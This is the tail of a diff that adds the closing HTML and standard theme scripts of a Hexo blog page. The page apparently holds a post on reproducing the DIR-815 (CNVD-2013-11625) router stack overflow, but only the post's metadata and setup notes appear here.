+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "CNVD-2013-11625",
+          url: "https://khighl.github.io.git/2025/06/11/CNVD-2013-11625%20%20DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: "DIR-815 栈溢出漏洞复现前言这是我选择复现的第一个iot漏洞,总是对栈溢出有种特别的执念,有种学了一大圈又绕回来的感觉 同时这个固件也是Mips架构的,正好加强一下自己对mips的理解 官方的漏洞报告：DIR-815 | 0 | 准备固件下载地址:下载  (需要挂梯子) binwalk安装：sudo apt install binwalk sasquatch安装：https://github.com/devttys0/sasquatch | 1 | 固件提取将下载的bin文件传送到虚拟机中",
+          date: "Wed Jun 11 2025 00:00:00 GMT+0800",
+          updated: "Thu Jun 12 2025 16:19:16 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
